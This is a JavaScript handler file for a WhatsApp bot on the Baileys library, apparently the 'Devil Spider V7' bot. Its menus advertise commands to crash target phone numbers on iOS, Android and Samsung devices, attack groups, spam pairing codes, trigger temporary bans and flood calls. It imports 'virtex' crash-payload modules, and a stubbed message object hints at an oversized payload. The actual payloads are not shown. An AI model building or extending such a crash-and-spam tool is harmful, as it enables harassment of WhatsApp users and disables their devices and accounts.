/*

# Base By devorsix
# Owner ? : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖓
!- do not delete this credit

*/
const {
tdxConnect,
downloadContentFromMessage,
emitGroupParticipantsUpdate,
emitGroupUpdate,
generateWAMessageContent,
generateWAMessage,
makeInMemoryStore,
prepareWAMessageMedia,
generateWAMessageFromContent,
MediaType,
areJidsSameUser,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
GroupMetadata,
initInMemoryKeyStore,
getContentType,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
ReconnectMode,
WAContextInfo,
proto,
WAGroupMetadata,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WAGroupInviteMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediaConnInfo,
URL_REGEX,
WAUrlInfo,
WA_DEFAULT_EPHEMERAL,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
GroupSettingChange,
DisconnectReason,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
fetchLatestBaileysVersion,
templateMessage,
InteractiveMessage,
Header
} = require("@whiskeysockets/baileys")
//=================================================//
const axios = require("axios")
const os = require("os").cpus().length
const util = require("util")
const jimp = require("jimp")
const fetch = require("node-fetch")
const speed = require("performance-now")
const moment = require("moment-timezone")
const pino = require("pino")
const { spawn: spawn, exec } = require("child_process")
const { Primbon } = require("scrape-primbon")
const primbon = new Primbon()
const fg = require("api-dylux")
const path = require("path")
const cheerio = require("cheerio")
const ytdl = require("ytdl-core")
const chalk = require("chalk")
const { color } = require("../trashbase/lib/color")
const FormData = require("form-data")
const crypto = require("crypto")
const yts = require("yt-search")
const bochil = require("@bochilteam/scraper")
const fakeUA = require("fake-useragent")
const randomUA = fakeUA().toString()
const fs = require("fs")
module.exports = tdx = handler = async (tdx, m, chatUpdate, store) => {
try {
//=================================================//
var body = m.mtype === "conversation" ? m.message.conversation : m.mtype === "imageMessage" ? m.message.imageMessage.caption : m.mtype === "videoMessage" ? m.message.videoMessage.caption : m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text : m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId : m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId : m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId : m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.message.interactiveResponseMessage?.nativeFlowResponseMessage || m.text : ""
//=================================================//
require("../config")
const {
smsg,
getGroupAdmins,
formatp,
h2k,
tanggal,
formatDate,
getTime,
isUrl,
sleep,
clockString,
msToDate,
sort,
toNumber,
enumGetKey,
runtime,
fetchJson,
getBuffer,
jsonformat,
delay,
format,
logic,
generateProfilePicture,
parseMention,
getRandom,
pickRandom
} = require("../trashbase/lib/myfunction")
const { remini } = require("../trashbase/lib/remini")
const { radio, locl, cds, listr, clpm, caltx, paym, locm, evm } = require("../trashbase/lib/msg-service")
const { toPTT, toAudio } = require("../trashbase/lib/converter")
const { UploadFileUgu, webp2mp4File, floNime, TelegraPh } = require("../trashbase/lib/uploader")
const { toTelegra } = require("../trashbase/lib/upload")
//=================================================//
const { groupMembers } = m
var budy = (typeof m.text == "string" ? m.text : "")
const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/
const prefix = prefa && prefixRegex.test(body) ? body.match(prefixRegex)[0] : (prefa ?? global.prefix)
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : ""
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const text = q = args.join(" ")
const fatkuns = (m.quoted || m)
const quoted = (fatkuns.mtype == "buttonsMessage") ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == "templateMessage") ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == "product") ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ""
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
//User
const botNumber = await tdx.decodeJid(tdx.user.id)
const itsMe = m.sender == botNumber ? true : false
const itsOrkay = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../trashbase/dtbs/premium.json'), 'utf8'))
const kontributor = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../trashbase/dtbs/owner.json'), 'utf8'))
const isDeveloper = [ botNumber, ...kontributor, ...global.ownMain ].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender)
const isPremium = [ botNumber, ...kontributor, ...itsOrkay, ...global.ownMain ].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender)
//=================================================//
//Group
const groupMetadata = m.isGroup ? await tdx.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isGroup = m.chat.endsWith('@g.us')
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
//=================================================//
const razer = fs.readFileSync(path.resolve(__dirname, '../trashbase/media/razer.jpg'))
const akame = fs.readFileSync(path.resolve(__dirname, '../trashbase/media/akame.jpg'))
const slash = fs.readFileSync(path.resolve(__dirname, '../trashbase/media/slash.jpg'))
const banner = fs.readFileSync(path.resolve(__dirname, '../trashbase/media/banner.jpg'))
const subaru = fs.readFileSync(path.resolve(__dirname, '../trashbase/media/subaru.jpg'))
const gifck = fs.readFileSync(path.resolve(__dirname, '../trashbase/media/tdx.mp4'))
const rick = fs.readFileSync(path.resolve(__dirname, '../trashbase/media/rick.mp4'))
const hwm = fs.readFileSync(path.resolve(__dirname, '../trashbase/media/here.mp3'))
const menunya = fs.readFileSync(path.resolve(__dirname, '../trashbase/media/menunya.jpg'))
const { tios, tiosv2, tiosv3 } =  require("../trashbase/virtex/tios.js")
const { tiv } =  require("../trashbase/virtex/tiv.js")
//=================================================//
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss")
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "夜 🌌"
} else if (time >= "15:00:00" && time < "19:00:00") {
ucapanWaktu = "午後 🌇"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "正午 🏞️"
} else if (time >= "06:00:00" && time < "11:00:00") {
ucapanWaktu = "朝 🌁"
} else {
ucapanWaktu = "夜明け 🌆"
}
const wib = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z")
const wita = moment(Date.now()).tz("Asia/Makassar").locale("id").format("HH:mm:ss z")
const wit = moment(Date.now()).tz("Asia/Jayapura").locale("id").format("HH:mm:ss z")
const salam = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a")
let d = new Date
let gmt = new Date(0).getTime() - new Date("1 Januari 2024").getTime()
let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString("id", {
weekday: "long"
})
let calender = d.toLocaleDateString("id", {
day: "numeric",
month: "long",
year: "numeric"
})
//=================================================//
if (!tdx.public) {
    if (!isDeveloper) return
}
//tdx.public = false
//=================================================//
async function exifAvatar(buffer, packname, author, categories = [''], extra = {}) {
    const {
        default: {
            Image
        }
    } = await import('node-webpmux')
    const img = new Image()
    const json = {
        'sticker-pack-id': 'parel-kntll',
        'sticker-pack-name': packname,
        'sticker-pack-publisher': author,
        'emojis': categories,
        'is-avatar-sticker': 1,
        ...extra
    }
    let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
    let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8')
    let exif = Buffer.concat([exifAttr, jsonBuffer])
    exif.writeUIntLE(jsonBuffer.length, 14, 4)
    await img.load(buffer)
    img.exif = exif
    return await img.save(null)
}
//=================================================//
async function addExif(webpSticker, packname, author, categories = [''], extra = {}) {
    const img = new webp.Image()
    const stickerPackId = Crypto.randomBytes(32).toString('hex')
    const json = {
        'sticker-pack-id': stickerPackId,
        'sticker-pack-name': packname,
        'sticker-pack-publisher': author,
        'emojis': categories,
        ...extra
    }
    let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
    let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8')
    let exif = Buffer.concat([exifAttr, jsonBuffer])
    exif.writeUIntLE(jsonBuffer.length, 14, 4)
    await img.load(webpSticker)
    img.exif = exif
    return await img.save(null)
}
//=================================================//
async function addExifAvatar(buffer, packname, author, categories = ["🥀"], extra = {}, ) {
    const {
        default: {
            Image
        },
    } = await import("node-webpmux")
    const img = new Image()
    const json = {
        "sticker-pack-id": "com.snowcorp.stickerly.android.stickercontentprovider b5e7275f-f1de-4137-961f-57becfad34f2",
        "sticker-pack-name": packname,
        "sticker-pack-publisher": author,
        emojis: categories,
        "is-ai-sticker": 1,
        "android-app-store-link": 'https://play.google.com/store/apps/details?id=com.snowcorp.stickerly.android',
        "ios-app-store-link": 'https://play.google.com/store/apps/details?id=com.snowcorp.stickerly.android',
        ...extra,
    }
    let exifAttr = Buffer.from([
        0x49, 0x49, 0x2a, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57,
        0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00,
    ])
    let jsonBuffer = Buffer.from(JSON.stringify(json), "utf8")
    let exif = Buffer.concat([exifAttr, jsonBuffer])
    exif.writeUIntLE(jsonBuffer.length, 14, 4)
    await img.load(buffer)
    img.exif = exif
    return await img.save(null)
}
//=================================================//
let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}
//=================================================//
const reaction = async (jidss, emoji) => {
    tdx.sendMessage(jidss, {
        react: {
            text: emoji,
            key: m.key
        }
    })
}
//=================================================//
async function crtImg(url) {
    const { imageMessage } = await generateWAMessageContent({
        image: { url }
        }, {
            upload: tdx.waUploadToServer
        })
    return imageMessage
}
//=================================================//
async function crtVid(url) {
    const { videoMessage } = await generateWAMessageContent({
        image: { url }
        }, {
            upload: tdx.waUploadToServer
        })
    return videoMessage
}
//=================================================//
async function prM(params) {
    return await prepareWAMessageMedia(params, { upload: tdx.waUploadToServer })
}
//=================================================//
const xreply = async (teks) => {
    await sleep(500)
    return tdx.sendMessage(m.chat, {
        contextInfo: {
            mentionedJid: [
                m.sender
            ],
            externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: false,
                title: `SpiderClient - Master`,
                body: `By 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                previewType: "VIDEO",
                thumbnail: razer,
                sourceUrl: `${global.url1}`,
                mediaUrl: `${global.url1}`
            }
        },
        text: teks
    }, {
        quoted: m
    })
    await sleep(500)
}
//=================================================//
const dust = {
    "key": {
        "remoteJid": "status@broadcast",
        "participant": "0@s.whatsapp.net",
        "fromMe": false
    },
    "message": {
        "interactiveMessage": {
            "header": {
                "title": ""
            },
            "body": {
                "text": "▾ 𝐒𝐏𝐈𝐃𝐄𝐑-𝐕7⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 ▾"
            },
            "footer": {
                "text": "by - 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒"
            },
            "nativeFlowMessage": {
                "messageParamsJson": "" //.repeat(850000)
            }
        }
    }
}
const troll = {
    key: {
        fromMe: false,
        participant: '0@s.whatsapp.net',
        remoteJid: "status@broadcast"
    },
    message: {
        orderMessage: {
            orderId: "2029",
            thumbnail: null,
            itemCount: 909,
            status: "INQUIRY",
            surface: "CATALOG",
            message: `MsG - ${m.body || m.mtype}`,
            token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
        }
    },
    contextInfo: {
        mentionedJid: m.sender.split,
        forwardingScore: 999,
        isForwarded: true
    }
}
const qpay = {
    key: {
        remoteJid: '',
        fromMe: false,
        participant: '0@s.whatsapp.net'
    },
    message: {
        paymentInviteMessage: {
            serviceType: 1,
            expiryTimestamp: 2
        }
    }
}
const vidq = {
    key: {
        remoteJid: '0@s.whatsapp.net',
        fromMe: false,
        participant: '0@s.whatsapp.net'
    },
    message: {
        videoMessage: {
            caption: "#Spider Client  - Master",
            jpegThumbnail: (await resize(slash, 300, 300)),
        }
    }
}
//=================================================//
// Ngambil semua plugin dari direktori dan subdirektori
const loadPlugins = (directory) => {
    let plugins = []
    const folders = fs.readdirSync(directory)
    folders.forEach(folder => {
        const folderPath = path.join(directory, folder)
        if (fs.lstatSync(folderPath).isDirectory()) {
            const files = fs.readdirSync(folderPath)
            files.forEach(file => {
                const filePath = path.join(folderPath, file)
                if (filePath.endsWith(".js")) {
try {
    delete require.cache[require.resolve(filePath)]
    const plugin = require(filePath)
    plugin.filePath = filePath
    plugins.push(plugin)
} catch (error) {
    console.error(`Error loading plugin at ${filePath}:`, error)
}
                }
            })
        }
    })
    return plugins
}
// Ngambil semua plugin dari direktori plugin
const plugins = loadPlugins(path.resolve(__dirname, "./plugin"))
const context = { tdx, m, chatUpdate, store, body, require, smsg, getGroupAdmins, formatp, h2k, tanggal, formatDate, getTime, isUrl, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, groupMembers, budy, prefixRegex, prefix, isCmd, command, args, pushname, text, q, fatkuns, quoted, mime, qmsg, isMedia, botNumber, itsMe, itsOrkay, kontributor, isDeveloper, isPremium, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, isGroup, groupOwner, isGroupOwner, time, ucapanWaktu, wib, wita, wit, salam, d, gmt, weton, week, calender, dust, reaction, xreply, TelegraPh, toTelegra, resize, remini, crtImg, crtVid, addExifAvatar, addExif, exifAvatar, prM, rick, razer, subaru, gifck,tios, tiosv2, tiosv3, tiv, evm, banner }
// Kode ini ngeliat plugin satu per satu, kalo nemu plugin yang cocok ama command yang diterima, dia langsung manggil fungsi operate-nya dan berhenti.
let handled = false
for (const plugin of plugins) {
    if (plugin.command.includes(command)) {
        try {
            await plugin.operate(context)
            handled = true
        } catch (error) {
            console.error(`Error executing plugin ${plugin.filePath}:`, error)
        }
        break
    }
}
//=================================================//
if (m.message) {
    console.log(chalk.green.bgHex("#e74c3c").bold(`\n💫 ${ucapanWaktu} 💫`))
    console.log(chalk.green.bgHex("#e74c3c").bold(`✉️ Pesan Baru`))
    console.log(chalk.black.bgHex("#00FF00")(`📅 Tanggal: ${new Date().toLocaleString()} \n💬 Pesan: ${m.body || m.mtype} \n🗣️ Pengirim: ${m.pushName} \n🔢 JID: ${m.sender}`))
    if (m.isGroup) {
        console.log(chalk.black.bgHex("#00FF00")(`🏷️ Grup: ${groupName}`))
        console.log(chalk.black.bgHex("#00FF00")(`🧷 GroupJid: ${m.chat}`))
    }
    //await sleep(1000)
    //await console.log(JSON.stringify(m.message))
}

/*if (!isGroup) {
    if (JSON.stringify(m.message).includes('"listType":"PRODUCT_LIST","productListInfo":{"productSections":[')) {
        tdx.updateBlockStatus(m.sender, 'block')
        tdx.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.sender)
    }

    if (JSON.stringify(m.message).includes('":{"message":{"interactiveMessage":{"header":{"') && /\\u0000|\\u0001|\\u0002|\\u0003/.test(JSON.stringify(m.message))) {
        tdx.updateBlockStatus(m.sender, 'block')
        tdx.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.sender)
    }
}*/

if (!handled) {
switch (command) {
//=================================================//
case 'menu': case 'spider':{
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let itsmenu = ` \`𝗗𝗘𝗩𝗜𝗟 𝗦𝗣𝗜𝗗𝗘𝗥 𝗩7\`
 ◉ 𝐇𝐞𝐥𝐥𝐨${m.pushName}
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃⦁ Creator : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
┃⦁ Library : WS-Baileys
┃⦁ Type : Case-Plug
┃⦁ Status : On
┃⦁ Mode : ${tdx.public ? 'Public' : 'Self'}
┃⦁ Prefix : ${prefix}
┃⦁ Resp Speed : ${latensi.toFixed(4)}
┃⦁ Runt : ${run}
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
       \`𝗠𝗘𝗡𝗨\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉  
┃✫ fullmenu
┃✫ specialbugs
┃✫ bug1
┃✫ bug2
┃✫ othermenu 
┃✫ downloadmenu
┃✫ gcbugs
┃✫ ownermenu
┃✫ gcmenu
┃✫ searchmenu
┃✫ aimenu
┃✫ spammenu
┃✫ ping
┃✫ runtime 
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
© 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
 
  tdx.sendMessage(m.chat, {
                        video: { url: `https://telegra.ph/file/471160dee4ab4f1d9dc7e.mp4`},
                        caption: itsmenu,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                    }
                 break
case 'fullmenu': {
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let opami = ` \`𝗗𝗘𝗩𝗜𝗟 𝗦𝗣𝗜𝗗𝗘𝗥 𝗩7\`
 ◉ 𝐇𝐞𝐥𝐥𝐨${m.pushName}
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃⦁ Creator : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
┃⦁ Library : WS-Baileys
┃⦁ Type : Case-Plug
┃⦁ Status : On
┃⦁ Mode : ${tdx.public ? 'Public' : 'Self'}
┃⦁ Prefix : ${prefix}
┃⦁ Resp Speed : ${latensi.toFixed(4)}
┃⦁ Runt : ${run}
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
     \`𝙊𝙒𝙉𝙀𝙍\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃✫ public
┃✫ self
┃✫ addprem
┃✫ delprem
┃✫ addowner
┃✫ delowner
┃✫ addplug
┃✫ cgplug
┃✫ rmplug
┃✫ getplug
┃✫ getq
┃✫ join [link group]
┃✫ leavegc
┃✫ block [nomor]
┃✫ unblock [nomor]
┃✫ listblock
┃✫ setppbot [reply gambar]
┃✫ setbiobot [teks]
┃✫ listpc
┃✫ =>
┃✫ >
┃✫ $
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
       \`𝙂𝘾 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃✫ editsubjek
┃✫ editdesk
┃✫ setppgroup
┃✫ setppgc
┃✫ linkgc
┃✫ resetlinkgc
┃✫ revoke
┃✫ kick
┃✫ add
┃✫ promote
┃✫ demote
┃✫ hidetag
┃✫ tagall
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
  \`𝙊𝙏𝙃𝙀𝙍\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃✫ sticker
┃✫ toimg
┃✫ ttp text|pix
┃✫ tts text|lang
┃✫ smeme text1|text2
┃✫ textmaker text1|text2
┃✫ tesc text
┃✫ tocc text
┃✫ stt text
┃✫ attp text
┃✫ toascii text
┃✫ qrcode text
┃✫ barcode text
┃✫ shorturl link
┃✫ removebg reply img
┃✫ remini reply img
┃✫ calculator
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
     \`𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿𝙎\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃✫ igdl url
┃✫ mediafire url
┃✫ ytmp3 url
┃✫ ytmp4 url
┃✫ gitclone url
┃✫ tiktok url
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
   \`𝗦𝙀𝘼𝙍𝘾𝙃\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃✫ pint query
┃✫ play query
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
  \`𝘼𝙄 𝙈𝙀𝙉𝙐\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉  
┃✫ rimuru-ai query
┃✫ trash-ai query
┃✫ ai query
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
        \`𝙑𝘾𝙁\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉   
┃✫ pushkontak teks
┃✫ jpm
┃✫ jpm2
┃✫ jpmht
┃✫ jpmht2
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
     \`𝗦𝗣𝗔𝗠\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉  
┃✫ spam-pair 2543###
┃✫ temp-ban 254##
┃✫ oto$
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
         \`𝗕𝗨𝗚 𝗠𝗘𝗡𝗨\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉  
┃✫ galaxy 254##
┃✫ rickast 254##
┃✫ radiob 254##
┃✫ cards 254##
┃✫ dropd 254##
┃✫ flowto 254##
┃✫ 1st 254##
┃✫ blobx 254##
┃✫ screen_0 254##
┃✫ dott
┃✫ breaak
┃✫ csx amount
┃✫ rickr amount
┃✫ call amount
┃✫ 🔥 amount
┃✫ 🏴‍☠️ amount
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
     \`𝗔𝗡𝗗𝗥𝗢 & 𝗜𝗢𝗦\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉    
┃✫ ext-3 254 ##
┃✫ paym 254##
┃✫ listeresp 254##
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
         \`𝗜𝗠𝗠𝗨𝗡𝗘\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉    
┃✫ matta-immn
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
     \`𝗜𝗢𝗦 𝗕𝗨𝗚𝗦\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉    
┃✫ crashios 254##
┃✫ gifplayback 254##
┃✫ ipay amount
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
   \`𝗦𝗔𝗠𝗦𝗨𝗠𝗚 𝗕𝗨𝗚𝗦\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃✫ samsung_cl 254##
┃✫ classx 254##
┃✫ castx 254##
┃✫ carsmsg amount
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
      \`𝗚𝗖 𝗕𝗨𝗚𝗦\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃✫ atk ( select group )
┃✫ getview idgc
┃✫ callmsg linkgc
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
© 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
    
`
tdx.sendMessage(m.chat, { 
	           text: opami,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: `𝗦𝗣𝗜𝗗𝗘𝗥-𝗩7`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://telegra.ph/file/ad0a4c2c76a99c4fd9484.jpg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
                    }
                 break
case 'gcbugs': {
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let vami = ` \`𝗗𝗘𝗩𝗜𝗟 𝗦𝗣𝗜𝗗𝗘𝗥 𝗩7\`
 ◉ 𝐇𝐞𝐥𝐥𝐨${m.pushName}
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃⦁ Creator : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
┃⦁ Library : WS-Baileys
┃⦁ Type : Case-Plug
┃⦁ Status : On
┃⦁ Mode : ${tdx.public ? 'Public' : 'Self'}
┃⦁ Prefix : ${prefix}
┃⦁ Resp Speed : ${latensi.toFixed(4)}
┃⦁ Runt : ${run}
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
      \`𝗚𝗖 𝗕𝗨𝗚𝗦\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃✫ atk ( select group )
┃✫ getview idgc
┃✫ callmsg linkgc
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
© 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
    
`
tdx.sendMessage(m.chat, { 
	           text: vami,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: `𝗦𝗣𝗜𝗗𝗘𝗥-𝗩7`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://telegra.ph/file/ad0a4c2c76a99c4fd9484.jpg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
                    }
                 break
 case 'ownermenu': {
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let jami = ` \`𝗗𝗘𝗩𝗜𝗟 𝗦𝗣𝗜𝗗𝗘𝗥 𝗩7\`
 ◉ 𝐇𝐞𝐥𝐥𝐨${m.pushName}
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃⦁ Creator : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
┃⦁ Library : WS-Baileys
┃⦁ Type : Case-Plug
┃⦁ Status : On
┃⦁ Mode : ${tdx.public ? 'Public' : 'Self'}
┃⦁ Prefix : ${prefix}
┃⦁ Resp Speed : ${latensi.toFixed(4)}
┃⦁ Runt : ${run}
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
     \`𝙊𝙒𝙉𝙀𝙍\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃✫ public
┃✫ self
┃✫ addprem
┃✫ delprem
┃✫ addowner
┃✫ delowner
┃✫ addplug
┃✫ cgplug
┃✫ rmplug
┃✫ getplug
┃✫ getq
┃✫ join [link group]
┃✫ leavegc
┃✫ block [nomor]
┃✫ unblock [nomor]
┃✫ listblock
┃✫ setppbot [reply gambar]
┃✫ setbiobot [teks]
┃✫ listpc
┃✫ =>
┃✫ >
┃✫ $
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
© 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
tdx.sendMessage(m.chat, { 
	           text: jami,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: `𝗦𝗣𝗜𝗗𝗘𝗥-𝗩7`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://telegra.ph/file/ad0a4c2c76a99c4fd9484.jpg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
                    }
                 break
 case 'specialbugs': {
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let oami = ` \`𝗗𝗘𝗩𝗜𝗟 𝗦𝗣𝗜𝗗𝗘𝗥 𝗩7\`
 ◉ 𝐇𝐞𝐥𝐥𝐨${m.pushName}
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
┃⦁ Creator : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
┃⦁ Library : WS-Baileys
┃⦁ Type : Case-Plug
┃⦁ Status : On
┃⦁ Mode : ${tdx.public ? 'Public' : 'Self'}
┃⦁ Prefix : ${prefix}
┃⦁ Resp Speed : ${latensi.toFixed(4)}
┃⦁ Runt : ${run}
┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉
      \`𝗜𝗢𝗦 𝗕𝗨𝗚𝗦\`
┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉    
┃✫ crashios 254##
┃✫ gifplayback 254##
